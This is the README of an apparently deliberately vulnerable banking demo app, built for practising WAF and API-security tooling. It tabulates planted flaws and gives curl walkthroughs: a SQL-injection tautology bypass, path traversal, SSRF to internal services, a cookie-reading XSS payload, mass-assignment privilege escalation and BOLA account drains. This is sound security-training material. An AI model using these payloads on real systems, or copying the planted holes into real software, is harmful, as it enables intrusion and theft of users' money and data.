# NimbusBank

A deliberately-vulnerable fintech demo app, built to practice F5 Distributed
Cloud (F5 XC) WAF and API Security features against: JWT validation at the
edge, OpenAPI schema validation, rate limiting, and bot/malicious-user
detection. **Phases 0–3 are done** — seven independent FastAPI microservices
(auth, accounts, transfers, kyc, support, cards, admin), each owning its own
Postgres database, fronted by a single Nginx gateway that also serves the
React SPA. Every service now also fires fire-and-forget request-log events to
admin-service, which exposes a single live ops/traffic dashboard. No rate
limiting, no WAF, no schema enforcement anywhere — on purpose. Next up: point
F5 XC at the gateway and layer those in.

Unlike [VulnCart](../vulncart) (a monolith bot-defense demo), NimbusBank is a
true microservices split — seven separate FastAPI services, seven separate
Postgres databases, **no cross-service database access, ever** (admin-service
aggregates only its own request-log table, never other services' data).
Services
that need to trust something about a request (who the caller is) do it the
way F5 XC itself does: by validating a JWT's signature against a JWKS
endpoint, not by reaching into another service's tables.

## What's intentionally missing

Every deliberate gap is marked in the code with `INTENTIONALLY VULNERABLE`
comments. Grep for it:

```bash
grep -rn "INTENTIONALLY VULNERABLE" services/
```

Summary, mapped to F5 XC's attack/feature categories:

| Gap | Where | F5 XC category |
|---|---|---|
| Instant verified account, no email confirmation/CAPTCHA/signup limit | `services/auth/app/main.py` (`register`) | Bot Protection: Fake Accounts |
| No rate limit/lockout on login; "no such user" vs "wrong password" | `services/auth/app/main.py` (`login`) | Bot Protection: Credential Stuffing / account enumeration |
| No rate limit/attempt cap on OTP verification (4-digit keyspace) | `services/auth/app/main.py` (`verify_otp`) | Bot Protection: OTP Bruteforce |
| Password-reset: "no such email" 404 vs. 200-with-token; no throttle on reset requests; short guessable 6-digit token; no attempt cap on token submission | `services/auth/app/main.py` (`forgot_password`, `reset_password`) | Bot Protection: account enumeration / reset flooding / token bruteforce |
| Mass assignment → privilege escalation — `PATCH /me` applies any field (incl. `role`, `is_verified`, `email`, `ssn_last4`) with no allowlist; a customer sets `role:"admin"` and unlocks every role-checked BFLA/admin endpoint in the app | `services/auth/app/main.py` (`update_me`) | API Security: Mass Assignment → Privilege Escalation / BFLA enabler |
| Change password without verifying the current one — `POST /password/change` accepts `current_password` but never checks it (session/token alone) | `services/auth/app/main.py` (`change_password`) | API Security: Broken Authentication / insufficient verification |
| BOLA — no ownership check, sequential integer ids | `services/accounts/app/main.py` (`get_account`) | API Security: Broken Object Level Authorization |
| Excessive data exposure — full SSN + DOB returned | `services/accounts/app/main.py` (`get_account`) | API Security: Sensitive Data Exposure |
| Mass assignment on `balance_cents` + no ownership check | `services/accounts/app/main.py` (`update_account`) | API Security: Mass Assignment + BOLA |
| SQL injection — f-string built into raw SQL | `services/accounts/app/main.py` (`search_accounts`) | WAF / OWASP Top 10: SQL Injection |
| Path traversal — unsanitized `file` query param | `services/accounts/app/main.py` (`get_statement`) | API Security / WAF: Path Traversal |
| SSRF — server fetches a fully attacker-controlled URL | `services/accounts/app/main.py` (`link_external_account`) | API Security / WAF: Server-Side Request Forgery |
| BOLA — no check `from_account_id` belongs to caller (now *really* drains the target account via `/internal/apply-transfer`) | `services/transfers/app/main.py` (`create_transfer`) + `services/accounts/app/main.py` (`apply_transfer`) | API Security: BOLA / business-logic flaw |
| No amount validation (negative allowed), no daily limit, no rate limit | `services/transfers/app/main.py` (`create_transfer`) | API Security / Bot Protection: unthrottled business logic |
| BOLA — `GET /transfers?account_id=` has no ownership check | `services/transfers/app/main.py` (`list_transfers`) | API Security: Broken Object Level Authorization |
| Stored XSS — `memo` rendered via `dangerouslySetInnerHTML` | `services/transfers/app/models.py` + `frontend/src/pages/TransactionHistory.jsx` | WAF / OWASP Top 10: Stored XSS |
| BFLA — admin-only route uses `get_current_user`, not `require_admin` | `services/transfers/app/main.py` (`admin_override`) | API Security: Broken Function Level Authorization |
| Malicious file upload — no type/extension/magic-byte/AV check, any file accepted | `services/kyc/app/main.py` (`upload_document`) | API Security / WAF: Malicious File Upload |
| Path traversal on write — client filename used unsanitized in the on-disk path | `services/kyc/app/main.py` (`upload_document`) | API Security / WAF: Path Traversal |
| No upload size cap — arbitrarily large bodies read into memory + written | `services/kyc/app/main.py` (`upload_document`) | API Security: unthrottled business logic / DoS |
| IDOR — read/download any customer's KYC doc by sequential id, no ownership check | `services/kyc/app/main.py` (`get_document`, `download_document`) | API Security: Broken Object Level Authorization |
| BFLA + PII exposure — `GET /kyc/pending` uses `get_current_user`, not `require_admin`; any customer enumerates every customer's identity docs | `services/kyc/app/main.py` (`list_pending`) | API Security: BFLA + Sensitive Data Exposure |
| BFLA — any customer can approve/reject anyone's KYC | `services/kyc/app/main.py` (`review_document`) | API Security: Broken Function Level Authorization |
| Inconsistent JWT validation — support skips `exp` (`verify_exp: False`); expired tokens still accepted here while every other service rejects them | `services/support/app/security.py` (`get_current_user`) | API Security: Broken Authentication / improper JWT validation |
| IDOR — read any ticket + its messages / post to any ticket by sequential id | `services/support/app/main.py` (`get_ticket`, `post_message`) | API Security: Broken Object Level Authorization |
| BFLA — `GET /tickets/all` agent console has no role check | `services/support/app/main.py` (`list_all_tickets`) | API Security: Broken Function Level Authorization |
| Stored XSS / formjacking — ticket `body` rendered via `dangerouslySetInnerHTML` in the agent console | `services/support/app/models.py` + `frontend/src/pages/AgentConsole.jsx` | WAF / OWASP Top 10: Stored XSS |
| BOLA / business-logic — issue a card against a funding account you don't own (no ownership check on `account_id`) | `services/cards/app/main.py` (`issue_card`) | API Security: BOLA / business-logic flaw |
| BOLA + excessive data exposure — read any card by sequential id, full PAN + CVV returned | `services/cards/app/main.py` (`get_card`) | API Security: Broken Object Level Authorization + Sensitive Data Exposure |
| Mass assignment + BOLA — PATCH sets any of `spend_limit_cents`/`status`/`account_id`/`user_id` on any card, no ownership check | `services/cards/app/main.py` (`update_card`) | API Security: Mass Assignment + BOLA |
| BOLA — freeze/unfreeze anyone's card by id, no ownership check | `services/cards/app/main.py` (`freeze_card`, `unfreeze_card`) | API Security: Broken Object Level Authorization |
| BFLA — staff traffic overview uses `get_current_user`, not `require_admin`; any customer reaches it | `services/admin/app/main.py` (`overview`) | API Security: Broken Function Level Authorization |
| No `limit_req` zone anywhere (including the new `/api/cards/` and `/api/admin/` locations) | `gateway/nginx.conf` | Unthrottled surface for every endpoint above |

What's **not** intentionally broken: passwords are bcrypt-hashed, access
tokens are RS256-signed and verified against a real JWKS (not just decoded
blindly), most queries are parameterized via SQLAlchemy (the one exception
is clearly marked), and money amounts are stored as integer cents. The gaps
above are specifically the OWASP API Security Top 10 / WAF-relevant gaps F5
XC is built to catch — not an exhaustive appsec audit.

A note on the two kinds of comment in this codebase: `INTENTIONALLY
VULNERABLE` marks a real gap you're meant to exploit and later fix with F5
XC. `LAB-ONLY` (e.g. the OTP being echoed back in `/login`'s response body,
or admin-service's `GET /admin/traffic` observability view being open with no
authentication so you can watch traffic during testing without first building
an admin login) marks a convenience that exists purely so you don't need to
stand up extra infrastructure to exercise the flow — it's not a security
property and isn't part of the vulnerability table above. (The *authenticated*
`GET /admin/overview`, by contrast, **is** a real BFLA gap and is in the table.)

## Try the gaps by hand

All commands go through the gateway on port 80. Start by registering,
logging in, and completing OTP to get a bearer token:

```bash
# Register
curl -s -X POST http://localhost/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@nimbusbank.io","full_name":"Demo User","password":"password123","ssn_last4":"9999"}'

# Login — grab user_id and otp straight out of the response (LAB-ONLY)
curl -s -X POST http://localhost/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@nimbusbank.io","password":"password123"}'
# => {"otp_required":true,"user_id":"<uuid>","otp":"1234"}

# Verify OTP -> access token
curl -s -X POST http://localhost/api/auth/login/otp/verify \
  -H "Content-Type: application/json" \
  -d '{"user_id":"<uuid-from-above>","otp":"<otp-from-above>"}'
# => {"access_token":"<jwt>", "token_type":"bearer", "user": {...}}

export TOKEN="<jwt-from-above>"
```

Or skip straight to a seeded user (see "Seeded test data" below) — same
`login` → `login/otp/verify` flow with `alice@nimbusbank.io` /
`password123`.

**Password reset — the token is handed straight back (LAB-ONLY), and it's
short + guessable + unthrottled:**

```bash
# Request a reset for a KNOWN email -> 200 with the token in the body.
curl -s -X POST http://localhost/api/auth/password/forgot \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@nimbusbank.io"}'
# => {"message":"...","user_id":"<uuid>","reset_token":"<6 digits>"}

# An UNKNOWN email returns a DISTINCT 404 -> account enumeration.
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost/api/auth/password/forgot \
  -H "Content-Type: application/json" -d '{"email":"nobody@nimbusbank.io"}'
# => 404 (a real bank returns the same response either way)

# Reset with the token -> new password. No attempt cap: the 6-digit token
# is a 1,000,000-key space with nothing throttling guesses here.
curl -s -X POST http://localhost/api/auth/password/reset \
  -H "Content-Type: application/json" \
  -d '{"token":"<token-from-above>","new_password":"newpassword123"}'
# => {"message":"Password has been reset. You can now sign in."}
# alice can now log in with newpassword123 (reset it back the same way if you like).
```

**Mass assignment → privilege escalation (the marquee new gap): become an
admin from a plain customer account.** Register a fresh customer, log in to get
`$TOKEN`, then:

```bash
# Before: a customer.
curl -s http://localhost/api/auth/me -H "Authorization: Bearer $TOKEN" | jq .role
# => "customer"

# PATCH /me has no field allowlist — send role:"admin".
curl -s -X PATCH http://localhost/api/auth/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"role":"admin"}' | jq .role
# => "admin"

# After: the row is genuinely admin now.
curl -s http://localhost/api/auth/me -H "Authorization: Bearer $TOKEN" | jq .role
# => "admin"

# Your NEXT access token will carry role:"admin" (log in again to mint one),
# which then satisfies any endpoint that actually checks role — e.g. the
# transfers admin-override reversal:
curl -s -X POST http://localhost/api/transfers/transfers/admin-override \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"transfer_id":1,"action":"reverse"}' | jq
```

**Change password without knowing the current one:** any wrong/empty
`current_password` still succeeds — the endpoint never checks it.

```bash
curl -s -X POST http://localhost/api/auth/password/change \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"current_password":"totally-wrong","new_password":"changed12345"}'
# => {"message":"Password changed."}  (current_password was never verified)
```

**BOLA — read any account by walking sequential ids** (works for any account
id 1-10 regardless of who you logged in as):

```bash
curl -s http://localhost/api/accounts/accounts/3 -H "Authorization: Bearer $TOKEN" | jq
# full SSN and date of birth come back even for accounts you don't own
```

**Mass assignment — set your own (or anyone's) balance to anything:**

```bash
curl -s -X PATCH http://localhost/api/accounts/accounts/3 \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"balance_cents": 999999999}'

curl -s http://localhost/api/accounts/accounts/3 -H "Authorization: Bearer $TOKEN" | jq .balance_cents
# => 999999999
```

**SQL injection — break the query with a single quote, or bypass it entirely:**

```bash
curl -s "http://localhost/api/accounts/accounts/search?q=checking" -H "Authorization: Bearer $TOKEN"

# A bare quote breaks the query (500 Internal Server Error) — proof this is
# raw string concatenation, not a bound parameter.
curl -s -w "\nHTTP %{http_code}\n" "http://localhost/api/accounts/accounts/search?q=%27" \
  -H "Authorization: Bearer $TOKEN"

# The endpoint splices `q` into two ILIKE clauses, so a working bypass needs
# to close the string, force a tautology, and comment out everything after
# it: q = x%' OR '1'='1' --
curl -s "http://localhost/api/accounts/accounts/search?q=x%25%27%20OR%20%271%27%3D%271%27%20--%20" \
  -H "Authorization: Bearer $TOKEN" | jq
# -> every account in the database, full SSNs and all, regardless of "x"
```

**Path traversal — read a file outside the statements/ directory:**

```bash
curl -s "http://localhost/api/accounts/accounts/3/statement?file=statement.csv" \
  -H "Authorization: Bearer $TOKEN"

curl -s "http://localhost/api/accounts/accounts/3/statement?file=../../../../../../etc/hostname" \
  -H "Authorization: Bearer $TOKEN"
# reads a file completely outside services/accounts/app/statements/
```

**SSRF — make the server fetch an arbitrary URL and reflect the response:**

```bash
curl -s -X POST http://localhost/api/accounts/accounts/link-external \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"account_id": 3, "verification_url": "http://accounts:8000/health"}' | jq
# status_code + body_snippet come from wherever verification_url points —
# try other internal service names/ports (auth:8000, transfers:8000) too
```

**BOLA on transfers — move funds out of an account that isn't yours:**

```bash
curl -s -X POST http://localhost/api/transfers/transfers \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 7, "to_account_id": 3, "amount_cents": 500000, "memo": "not my account"}' | jq
```

**Stored XSS — plant a payload in a memo, then view it in the UI's transaction history:**

```bash
curl -s -X POST http://localhost/api/transfers/transfers \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 3, "to_account_id": 5, "amount_cents": 100, "memo": "<img src=x onerror=alert(document.cookie)>"}' 
# then visit http://localhost/accounts/3/history in a browser
```

**BFLA — override a transfer's status as a non-admin customer:**

```bash
curl -s -X POST http://localhost/api/transfers/transfers/admin-override \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"transfer_id": 1, "new_status": "reversed"}' | jq
# succeeds even though $TOKEN belongs to a "customer", not an "admin"
```

**Malicious file upload + path-traversal-on-write — upload any file with a
booby-trapped name** (the full gateway path is `/api/kyc/kyc/...` — the
repeated `kyc` is correct, same URL shape as accounts/transfers):

```bash
# An EICAR-style / arbitrary file sails through — no type, extension, magic-byte
# or AV check. The multipart `filename` is used unsanitized to build the on-disk
# path, so a "../"-laden name escapes the uploads/ directory on write.
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR' > /tmp/evil.com
curl -s -X POST http://localhost/api/kyc/kyc/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F 'doc_type=id_card' \
  -F 'file=@/tmp/evil.com;filename=../../../../tmp/pwned_by_kyc.txt' | jq
# -> stored_path lands OUTSIDE services/kyc/app/uploads/ ; nothing scanned it
```

**KYC IDOR — read (and download) another customer's identity document by id:**

```bash
curl -s http://localhost/api/kyc/kyc/1 -H "Authorization: Bearer $TOKEN" | jq
# metadata for a doc you don't own — no ownership check, sequential ids
curl -s http://localhost/api/kyc/kyc/1/download -H "Authorization: Bearer $TOKEN"
# streams back the raw file (incl. anything uploaded above, unscanned)
```

**KYC BFLA + PII exposure — the compliance queue with a plain customer token:**

```bash
curl -s http://localhost/api/kyc/kyc/pending -H "Authorization: Bearer $TOKEN" | jq
# every user's pending identity documents — meant to be compliance-officer-only,
# but guarded by get_current_user, not require_admin

# Same gap on the review action: approve anyone's KYC as a non-admin customer
curl -s -X POST http://localhost/api/kyc/kyc/1/review \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"status":"approved"}' | jq
```

**Support IDOR — read a ticket (and its messages) that isn't yours:**

```bash
curl -s http://localhost/api/support/tickets/1 -H "Authorization: Bearer $TOKEN" | jq
# any ticket id 1..N, regardless of who you logged in as
curl -s http://localhost/api/support/tickets/all -H "Authorization: Bearer $TOKEN" | jq
# the whole "agent console" list — no role check
```

**Support stored XSS / formjacking — plant a payload in a ticket message, then
open the agent console:**

```bash
curl -s -X POST http://localhost/api/support/tickets/1/messages \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"sender":"customer","body":"<img src=x onerror=alert(document.cookie)>"}' | jq
# then visit http://localhost/support/agent in a browser — it renders message
# bodies with dangerouslySetInnerHTML, so the payload fires in the agent's tab
```

**Inconsistent JWT validation — an expired token still works against support:**

```bash
# Mint a short-lived token (JWT_EXPIRE_MINUTES controls access-token lifetime),
# wait for it to expire, then compare the two services:
curl -s http://localhost/api/support/tickets -H "Authorization: Bearer $EXPIRED"
# -> 200: support skips the exp check (verify_exp=False in its security.py)
curl -s -o /dev/null -w "%{http_code}\n" \
  http://localhost/api/accounts/accounts -H "Authorization: Bearer $EXPIRED"
# -> 401: accounts (and auth, transfers, kyc) validate exp correctly
```

**Cards BOLA — issue a card against a funding account you don't own** (the full
gateway path is `/api/cards/cards/...` — the repeated `cards` is correct, same
URL shape as accounts/transfers):

```bash
# Alice's token, but fund the card off carol's checking account (id 7). No
# ownership check on account_id — the card is accepted.
curl -s -X POST http://localhost/api/cards/cards \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"account_id": 7, "card_type": "virtual"}' | jq
```

**Cards BOLA + sensitive data exposure — read any card by id, full PAN + CVV:**

```bash
curl -s http://localhost/api/cards/cards/2 -H "Authorization: Bearer $TOKEN" | jq
# a card you don't own (seeded id 2 belongs to bob) — the response includes the
# full 16-digit card_number and the cvv, not just last4
```

**Cards mass assignment — raise your spend limit sky-high (or reassign a card):**

```bash
curl -s -X PATCH http://localhost/api/cards/cards/1 \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"spend_limit_cents": 999999999}' | jq .spend_limit_cents
# => 999999999 — no allowlist, no ownership check; user_id/account_id are
# mass-assignable here too
```

**Cards BOLA — freeze someone else's card:**

```bash
curl -s -X POST http://localhost/api/cards/cards/3/freeze -H "Authorization: Bearer $TOKEN" | jq .status
# => "frozen" — card id 3 is carol's, frozen by a token that isn't hers
curl -s -X POST http://localhost/api/cards/cards/3/unfreeze -H "Authorization: Bearer $TOKEN" | jq .status
```

**Admin BFLA — reach the staff traffic overview as a plain customer:**

```bash
curl -s http://localhost/api/admin/admin/overview -H "Authorization: Bearer $TOKEN" | jq
# => aggregate counts — 200 even though $TOKEN is a "customer", not an "admin"
# (guarded by get_current_user, not require_admin)
```

**Cross-service request logging — watch traffic on the open ops view:**

```bash
# Every service posts a fire-and-forget log event to admin-service after each
# request. /admin/traffic is LAB-ONLY open observability (no auth), so you can
# just watch it:
curl -s http://localhost/api/admin/admin/traffic | jq '{total, per_service, per_status_bucket}'
curl -s http://localhost/api/admin/admin/traffic | jq '.recent[0:5]'
# Logging is non-blocking: stop admin and services keep working normally.
#   docker compose stop admin
#   curl -s http://localhost/api/cards/cards -H "Authorization: Bearer $TOKEN"  # still 200
#   docker compose start admin
```

## Money movement, FX, and TOTP

These are real features layered on top of the deliberately-vulnerable core —
they make the app behave like an actual bank without softening any of the
gaps above.

### Transfers really move money (and convert currency)

`POST /transfers` now does more than insert a row. After recording the
transfer it calls accounts-service over the internal docker network at
`POST http://accounts:8000/internal/apply-transfer` — the single place a
balance actually changes. That endpoint debits the source account, credits
the (currency-converted) destination, and commits atomically; the returned
conversion details (`currency`, `to_amount_cents`, `to_currency`, `fx_rate`)
are persisted back onto the transfer row. If the accounts call fails the
transfer row is kept and marked `failed` instead of crashing the request.

`/internal/apply-transfer` is **not** exposed through the gateway — it's a
service-to-service call. It deliberately performs **no ownership check** and
enforces **no balance floor** (balances may go negative), inheriting the same
intentional stance as the rest of accounts-service. That's what turns the
transfers-service BOLA into a real drain of someone else's account.

FX is a fixed static table (USD per 1 unit), defined once in
`services/accounts/app/fx.py` and mirrored client-side in
`frontend/src/money.js` purely for the transfer form's live preview — the
server stays authoritative on execution:

| Currency | USD per unit |
|---|---|
| USD | 1.00 |
| EUR | 1.08 |
| GBP | 1.27 |
| JPY | 0.0067 |
| KES | 0.0078 |

Conversion is `to_amount = round(from_amount * fx[from] / fx[to])`, and
`fx_rate` is stored as the effective from→to multiplier.

```bash
# Same-currency transfer (alice's own USD checking 3 -> USD savings 4):
# both balances move by 5000 cents.
curl -s -X POST http://localhost/api/transfers/transfers \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 3, "to_account_id": 4, "amount_cents": 5000, "memo": "same ccy"}' | jq

# Cross-currency (USD acct 3 -> EUR acct 5): 10800 USD cents debited,
# 10000 EUR cents credited (108.00 * 1.00/1.08 = 100.00), fx_rate ~0.9259.
curl -s -X POST http://localhost/api/transfers/transfers \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 3, "to_account_id": 5, "amount_cents": 10800, "memo": "USD->EUR"}' | jq

# Re-GET both accounts to confirm the balances actually changed.
curl -s http://localhost/api/accounts/accounts/3 -H "Authorization: Bearer $TOKEN" | jq .balance_cents
curl -s http://localhost/api/accounts/accounts/5 -H "Authorization: Bearer $TOKEN" | jq .balance_cents
```

### Real TOTP (Google Authenticator), alongside the weak OTP

The weak 4-digit echoed OTP path is untouched — it's a vulnerability and it
stays. On top of it, a user can opt into a real RFC 6238 authenticator-app
second factor from the Security page. Both paths coexist: `POST /login` now
also returns `totp_enabled`, and the frontend routes to the 6-digit
`POST /login/totp/verify` when it's true, or the weak `POST /login/otp/verify`
when it's false.

New auth-service endpoints (all bearer-authenticated except the login-step
ones):

| Endpoint | Purpose |
|---|---|
| `POST /totp/enroll` | Generate a base32 secret (stays unconfirmed) and return `{secret, otpauth_uri, qr_png_base64}` |
| `POST /totp/confirm` | Verify a 6-digit code and flip `totp_enabled` on |
| `POST /totp/disable` | Clear the secret and turn TOTP off |
| `GET /totp/status` | `{totp_enabled}` for the current user |
| `POST /login/totp/verify` | Login step 2 for TOTP users — validates a 6-digit code, issues the same access token + refresh cookie as the OTP path |

```bash
# Enroll (returns the secret + an otpauth:// URI + a base64 PNG QR):
curl -s -X POST http://localhost/api/auth/totp/enroll -H "Authorization: Bearer $TOKEN" | jq '{secret, otpauth_uri}'

# Compute a code from the returned secret and confirm:
CODE=$(python3 -c "import pyotp,sys;print(pyotp.TOTP(sys.argv[1]).now())" "$SECRET")
curl -s -X POST http://localhost/api/auth/totp/confirm -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d "{\"code\":\"$CODE\"}" | jq

# Next login reports totp_enabled=true; finish with /login/totp/verify:
curl -s -X POST http://localhost/api/auth/login/totp/verify -H "Content-Type: application/json" \
  -d "{\"user_id\":\"<uuid>\",\"code\":\"$CODE\"}" | jq
```

## Stack

- **Postgres 16**, one container, seven databases: `auth`, `accounts`,
  `transfers`, `kyc`, `support`, `cards`, `admin` — all in use as of Phase 3.
  Each service connects to exactly one database and never touches another's.
- **auth-service** (FastAPI, async SQLAlchemy + asyncpg) — users, login,
  OTP, JWT/JWKS issuance, and the account-lifecycle flows (password
  reset via `POST /password/forgot` + `/password/reset`, profile edit via
  `PATCH /me`, and `POST /password/change`). The only service holding the
  RS256 private key (2048-bit, generated on first boot, persisted in a docker
  volume).
- **accounts-service** / **transfers-service** / **kyc-service** /
  **support-service** / **cards-service** (FastAPI) — validate bearer tokens by
  fetching auth-service's public JWKS over the internal docker network; hold no
  signing key of their own. (support-service deliberately skips the token's
  `exp` check — see its `security.py` and the vulnerability table.)
  kyc-service adds multipart file upload (`python-multipart`) and stores files
  under `services/kyc/app/uploads/`. cards-service issues payment cards funded
  by accounts (the funding account is a logical reference only — no
  cross-service FK or lookup).
- **admin-service** (FastAPI) — the central request-log sink and ops-traffic
  API. Every other service posts a fire-and-forget log event to its `/ingest`
  after each request; `GET /admin/traffic` (open, LAB-ONLY) drives the live Ops
  dashboard and `GET /admin/overview` is the authenticated (but role-unchecked,
  BFLA) staff view. It aggregates only its own `request_logs` table and never
  reads another service's database, so it deliberately does **not** depend on
  auth at boot.
- **request logging** — a tiny `obslog.py` copied per service adds an HTTP
  middleware that fires the log POST via `asyncio.create_task` with a
  short-timeout httpx client, wrapped so it can never block or fail the real
  request. If admin-service is down the event is silently dropped and every
  service keeps working normally.
- **React** (Vite) — SPA, built and served as static files.
- **Nginx** — single entry point: serves the built frontend and reverse
  proxies `/api/auth/`, `/api/accounts/`, `/api/transfers/`, `/api/kyc/`,
  `/api/support/`, `/api/cards/`, `/api/admin/` to the seven services. This is
  also where F5 XC slots in later — point your XC origin pool at this Nginx, no
  app changes required.

A note on URL shape: each service's own routes already include their
resource name (e.g. accounts-service defines `GET /accounts/{id}`, not just
`GET /{id}`), and the gateway's `/api/accounts/` location strips only the
`/api/accounts/` prefix before proxying. So the full path from a browser is
`/api/accounts/accounts/{id}` — the repeated `accounts` looks odd but is
correct; see `gateway/nginx.conf` and each service's `main.py`.

## Running it

1. Copy the environment file and set a real Postgres password:
   ```bash
   cp .env.example .env
   # edit POSTGRES_PASSWORD in .env — or: 
   sed -i "s/^POSTGRES_PASSWORD=.*/POSTGRES_PASSWORD=$(openssl rand -hex 16)/" .env
   ```
2. Build and start everything:
   ```bash
   docker compose up -d --build
   ```
3. Check health:
   ```bash
   docker compose ps
   curl http://localhost/api/auth/health
   curl http://localhost/api/accounts/health
   curl http://localhost/api/transfers/health
   curl http://localhost/api/kyc/health
   curl http://localhost/api/support/health
   curl http://localhost/api/cards/health
   curl http://localhost/api/admin/health
   ```
4. Visit `http://localhost/` in a browser: register an account (or sign in
   as one of the seeded users below), view your dashboard, open an account,
   send a transfer, and check its transaction history.

Postgres data and the auth-service RSA keypair live in named docker
volumes, untouched by image rebuilds. Each service's schema is created and
evolved by Alembic (see below) — every container runs `alembic upgrade head`
on startup, then seeds only if empty — so re-running `docker compose up -d
--build` never duplicates or loses data.

## Database migrations

Schema is managed with [Alembic](https://alembic.sqlalchemy.org/), one
independent migration history per service. Each service owns its own
`alembic.ini`, `alembic/env.py`, and `alembic/versions/` under
`services/<svc>/`, and its own `alembic_version` table inside its own
database — there is no cross-service migration, exactly as there is no
cross-service database access. The app talks to Postgres over `asyncpg`;
Alembic runs its migrations with the sync `psycopg2` driver (`env.py`
rewrites `+asyncpg` → `+psycopg2` from `DATABASE_URL`).

On startup each container's `entrypoint.sh` runs `alembic upgrade head`
before uvicorn, so tables exist before the app seeds. The one-time baseline
migration for every service was generated fresh against an empty database,
so **schema changes no longer require `docker compose down -v`** (which
wipes all data). To change a schema:

```bash
# 1. edit the service's app/models.py
# 2. generate a migration (bind-mount so the file lands on the host):
docker compose run --rm -v "$(pwd)/services/<svc>:/app" --entrypoint "" <svc> \
  alembic revision --autogenerate -m "describe the change"
# 3. apply it live, no data loss:
docker compose up -d --build <svc>
```

Step 3 rebuilds just that service and its entrypoint runs `alembic upgrade
head` against the existing database, adding the new column/table while
leaving seeded rows and balances intact. Commit the generated file in
`services/<svc>/alembic/versions/` — migrations are part of the repo.

### Local frontend dev (optional, faster iteration)

```bash
cd frontend
npm install
npm run dev    # http://localhost:5173, proxies /api/* to the services on 8001-8003
```

Run the three services separately for this (each needs its own venv or a
shared one — they don't share dependencies across services):

```bash
cd services/auth
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
export DATABASE_URL=postgresql+asyncpg://nimbusbank:change_me_please@localhost:5432/auth
uvicorn app.main:app --reload --port 8001
```
(Repeat for `services/accounts` on 8002, `services/transfers` on 8003,
`services/kyc` on 8004, and `services/support` on 8005, each with its own
`DATABASE_URL` pointing at `accounts` / `transfers` / `kyc` / `support`.
Easiest is `docker compose up db` for a local Postgres with all five
databases already created.)

## Seeded test data

Five auth-service users, all with `is_verified=true` out of the box:

| Email | Password | Role |
|---|---|---|
| admin@nimbusbank.io | admin123 | admin |
| alice@nimbusbank.io | password123 | customer |
| bob@nimbusbank.io | password123 | customer |
| carol@nimbusbank.io | password123 | customer |
| dave@nimbusbank.io | password123 | customer |

Ten accounts (checking + savings per user), ids assigned sequentially by
Postgres so they land at 1-10 on a fresh database. Each user's two accounts
share one currency, so cross-user transfers exercise FX conversion:

| Account id | Owner | Type | Currency |
|---|---|---|---|
| 1 | admin | checking | USD |
| 2 | admin | savings | USD |
| 3 | alice | checking | USD |
| 4 | alice | savings | USD |
| 5 | bob | checking | EUR |
| 6 | bob | savings | EUR |
| 7 | carol | checking | GBP |
| 8 | carol | savings | GBP |
| 9 | dave | checking | JPY |
| 10 | dave | savings | JPY |

Three seeded transfers exist between accounts 3, 5, 7, and 9 so the
transaction history view isn't empty on first load.

kyc-service seeds three KYC documents (sequential ids 1-3: two for alice, one
for bob), with tiny placeholder files written into
`services/kyc/app/uploads/` at seed time so the download route serves
something real out of the box. Two are `pending`, so `GET /kyc/pending` has
rows to leak. support-service seeds two tickets (ids 1-2: alice's card issue,
bob's 2FA question) with a few messages each, so the customer view and the
agent console aren't empty.

cards-service seeds one virtual card per seeded customer — sequential ids 1-4:
alice (funded by checking account 3), bob (account 5, `frozen`), carol
(account 7), dave (account 9, `frozen`) — each with a random full PAN, CVV, and
an expiry ~3 years out. So `GET /cards/cards/{1..4}` leaks a full PAN + CVV out
of the box, and a couple start frozen for variety. admin-service seeds nothing:
its `request_logs` table fills as soon as traffic flows, and the Ops dashboard
(`/ops` in the UI, `GET /admin/traffic`) shows it live.

All five seeded users stay on the weak echoed-OTP login path out of the box
(`totp_enabled = false`) so the curl flows above keep working. Real
authenticator-app (TOTP) enrollment is opt-in per user via the Security page
in the UI — see "Money movement, FX, and TOTP" below.

The five seeded user ids are fixed UUIDs shared (by hand, as literal
constants) between `services/auth/app/seed.py` and
`services/accounts/app/seed.py` — see the comment at the top of either file.
This is the one place seed data across services has to agree; it's a
seeding convenience only, not a runtime dependency between the databases.

## Testing

An automated integration test suite lives in [`tests/`](tests/). It runs
black-box against the **live** stack through the gateway and has two jobs:
(1) confirm the happy paths work, and (2) **lock in the intentional
vulnerabilities** — every gap in the `INTENTIONALLY VULNERABLE` table above has
a test asserting it is *still* exploitable, so a future refactor that
accidentally "fixes" or breaks one fails the suite loudly. See
[`tests/README.md`](tests/README.md) for the full layout and details.

Bring the stack up first (`docker compose up -d`, all healthy — do **not** use
`-v`), then run the suite. The preferred way needs no host Python — it uses an
opt-in `tests` service under the `test` compose profile (so it never starts on
a normal `docker compose up`):

```bash
docker compose up -d                 # stack must be healthy
docker compose run --rm tests        # builds tests/Dockerfile, runs pytest -q
```

Or, if you have Python 3.11+ on the host:

```bash
cd tests
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
pytest -q                            # BASE_URL defaults to http://localhost:80
```

